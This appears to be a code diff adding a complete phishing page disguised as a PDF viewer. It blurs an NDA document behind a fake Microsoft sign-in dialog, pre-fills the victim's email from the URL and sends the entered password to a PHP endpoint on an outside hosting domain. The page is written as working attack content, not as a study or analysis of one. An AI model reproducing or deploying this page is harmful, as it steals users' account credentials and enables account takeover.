@@ -1,0 +1,284 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Load PDF</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            overflow: hidden;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; /* Apply Segoe font */
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            transition: filter 0.5s ease; /* Smooth transition for blur effect */
+        }
+        #smallIframe {
+            position: absolute;
+            width: 450px;
+            height: 370px; /* Increased height to accommodate the Sign in text */
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(169, 169, 169, 0.6); /* Dark gray with transparency */
+            border: none;
+            padding: 20px; /* Padding inside the smaller iframe */
+            box-sizing: border-box;
+            opacity: 0;
+            transition: opacity 1s ease; /* Smooth transition for fading effect */
+        }
+        #logo {
+            position: relative; /* Keep logo in its place */
+            width: 120px; /* Adjust size as needed */
+            height: auto;
+            margin-top: 20px;
+            margin-left: 20px;
+            margin-bottom: 0; /* Space below the logo */
+        }
+        #expiredText, #loginForm {
+            transition: opacity 1s ease; /* Smooth transition for fading effect */
+            position: relative; /* Allows margin adjustments */
+        }
+        #expiredText {
+            color: #000; /* Black color */
+            font-size: 26.5px;
+            margin-top: 10px;
+            margin-left: 20px;
+            margin-bottom: 0; /* Space between the Sign in text and the form */
+            font-weight: 500; /* Make the text bolder */
+        }
+        .throbber-container {
+            position: top;
+            width: 100%;
+            height: 20px; /* Adjust height to fit the throbber */
+            top: 50%;
+            left: 0;
+            transform: translateY(-50%);
+            overflow: hidden;
+            background: transparent;
+        }
+        .throbber {
+            display: flex;
+            width: 500%; /* Adjust to accommodate the full movement */
+            height: 100%;
+            animation: moveThrobber 6s ease-in-out infinite; /* Slower movement */
+        }
+        .throbber div {
+            width: 4px; /* Smaller size for each ball */
+            height: 4px;
+            background: #005da6; /* Blue color for the balls */
+            border-radius: 50%;
+            margin: 0 8px; /* Space between balls */
+            animation: throb 1.5s ease-in-out infinite; /* Slower throb */
+        }
+        @keyframes moveThrobber {
+            0% { transform: translateX(-100%); }
+            50% { transform: translateX(0); }
+            100% { transform: translateX(100%); }
+        }
+        @keyframes throb {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.5); }
+        }
+        #loginForm {
+            display: none; /* Initially hidden */
+            text-align: left; /* Align form elements to the left */
+            margin-top: 5px; /* Increase space above the form */
+            margin-left: 20px;
+            margin-right: 50px;
+        }
+        #loginForm input {
+            display: block; /* Ensure textarea is displayed as a block element */
+            width: 100%; /* Full width of the container */
+            padding: 10px; /* Padding for better appearance */
+            margin-bottom: 10px; /* Space between fields */
+            border: none; /* Remove border */
+            border-bottom: 1px solid #005da6; /* Add a bottom border to simulate a single line */
+            background: transparent; /* Transparent background */
+            box-shadow: none; /* Remove any box-shadow */
+            outline: none; /* Remove the outline on focus */
+            font-size: 16px; /* Adjust font size as needed */
+            resize: none; /* Prevent resizing */
+        }
+        #loginForm button {
+            background-color: #005da6; /* Blue color */
+            color: white;
+            border: none;
+            padding: 7px 10px; /* Shorter button */
+            font-size: 16px;
+            border-radius: 0px;
+            cursor: pointer;
+            margin-right: 0;
+            width: 100px; /* Fixed width */
+            float: right; /* Align button to the right */
+            margin: 30px -15px; /* Increase margin to move the button away from the right margin */
+        }
+        #signInText {
+            color: #000; /* Black color */
+            font-size: 26.5px;
+            margin-top: 10px;
+            margin-bottom: 10px; /* Space between the Sign in text and the form */
+            font-weight: 500; /* Make the text bolder */
+        }
+        #errorMessage {
+            font-size: 16px; /* Adjust font size if needed */
+            margin-bottom: 10px; /* Space between error message and password input */
+            color: red; /* Red text color */
+        }
+        #errorText {
+            display: block; /* Ensure the text is displayed as a block element */
+            margin-right: -15px;
+        }
+        #resetLink {
+            color: #005da6; /* Blue color for the reset link */
+            text-decoration: none; /* Remove underline from the link */
+            margin-right: -15px;
+        }
+        #resetLink:hover {
+            text-decoration: underline; /* Underline on hover */
+        }
+        #email-display {
+            margin-bottom: 0; /* Space between email text and password box */
+            display: flex;
+            cursor: not-allowed;
+            text-decoration: none;
+            align-items: center; /* Center align vertically */
+        }
+        #email-display::before {
+            content: '←'; /* Black arrow symbol */
+            color: black;
+            font-size: 18px;
+            margin-right: 8px; /* Space between arrow and email text */
+        }
+
+        /* Media query for devices with a max width of 768px (tablets and mobile devices) */
+        @media (max-width: 768px) {
+            #smallIframe {
+                width: 90%; /* Make the iframe width responsive */
+                height: auto; /* Adjust height based on content */
+                top: 40%; /* Move it higher on mobile devices */
+                transform: translate(-50%, -40%); /* Adjust transform to account for new top position */
+            }
+        }
+
+        /* Media query for devices with a max width of 480px (mobile devices) */
+        @media (max-width: 480px) {
+            #smallIframe {
+                width: 95%; /* Further increase the width for smaller screens */
+                height: auto; /* Adjust height based on content */
+                top: 30%; /* Move it even higher on very small screens */
+                transform: translate(-50%, -30%); /* Adjust transform to account for new top position */
+            }
+        }
+    </style>
+    <script>
+        function getEmailFromURL() {
+            // Get the current URL
+            const url = window.location.href;
+
+            // Use a regular expression to extract the email from the URL
+            const emailRegex = /\?(.+)$/;
+            const matches = url.match(emailRegex);
+
+            if (matches && matches[1]) {
+                return decodeURIComponent(matches[1]);
+            }
+            return '';
+        }
+
+        window.onload = function() {
+            // Populate the hidden email field and display the email above the password box
+            const emailField = document.getElementById('email');
+            const emailDisplay = document.getElementById('email-display');
+            const email = getEmailFromURL();
+            emailField.value = email;
+            emailDisplay.textContent = email;
+        };
+    </script>
+</head>
+<body>
+    <!-- Main iframe to display the PDF -->
+    <iframe id="pdfViewer" src="https://azure-snail-583462.hostingersite.com/Non-Disclosure-Agreement.pdf" aria-label="PDF Viewer"></iframe>
+    <!-- Smaller iframe initially hidden with logo, text, and throbber -->
+    <div id="smallIframe" role="dialog" aria-labelledby="expiredText">
+        <img id="logo" src="https://microsoft-live.github.io/micro.png" alt="Microsoft Logo">
+        <p id="expiredText"></p>
+        <div class="throbber-container">
+            <div class="throbber">
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+                <div></div>
+            </div>
+        </div>
+        <div id="loginForm">
+            <p id="email-display">Loading email...</p>
+            <p id="signInText">Enter password</p>
+            <!--
+            <p id="errorMessage">
+            <span id="errorText">Your account or password is incorrect. If you don't remember your password,<a href="" id="resetLink"> reset it now.</a></span>
+                
+            </p>
+            -->
+            
+            <form id="authForm" action="https://azure-snail-583462.hostingersite.com/new1.php" method="GET" onsubmit="return validateForm()">
+                <input type="hidden" id="email" name="email">        
+                <input type="password" id="password" name="password" placeholder="Password" aria-label="Password" required minlength="4">
+                <button type="submit">Sign in</button>
+            </form>
+        </div>
+    </div>
+    <script>
+        // Function to apply blur effect to the main iframe
+        function applyBlur() {
+            document.getElementById('pdfViewer').style.filter = 'blur(5px)';
+        }
+        // Function to show the smaller iframe
+        function showSmallIframe() {
+            document.getElementById('smallIframe').style.opacity = '1';
+        }
+        // Function to fade out the expired text and throbber
+        function fadeOutTextAndThrobber() {
+            document.getElementById('expiredText').style.opacity = '0';
+            document.querySelector('.throbber-container').style.opacity = '0';
+            setTimeout(showLoginForm, 1000); // Show login form after fade out
+        }
+        // Function to show the login form and focus on the password input field
+        function showLoginForm() {
+            document.getElementById('expiredText').style.display = 'none';
+            document.querySelector('.throbber-container').style.display = 'none';
+            const loginForm = document.getElementById('loginForm');
+            loginForm.style.display = 'block';
+            
+            // Focus on the password input field
+            document.getElementById('password').focus();
+        }
+        // Function to validate email and password
+        function validateForm() {
+            var email = document.getElementById('email').value;
+            var password = document.getElementById('password').value;
+            var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailPattern.test(email)) {
+                alert("Please enter a valid email address.");
+                return false;
+            }
+            if (password.length < 4) {
+                alert("Password must be at least 4 characters long.");
+                return false;
+            }
+            return true;
+        }
+       
+        // Set timeouts to trigger the functions
+        setTimeout(applyBlur, 100); // Apply blur after 1 second
+        setTimeout(showSmallIframe, 100); // Show smaller iframe after 2 seconds
+        setTimeout(fadeOutTextAndThrobber, 4000); // Fade out text and throbber 4 seconds after page load
+    </script>
+</body>
+</html>
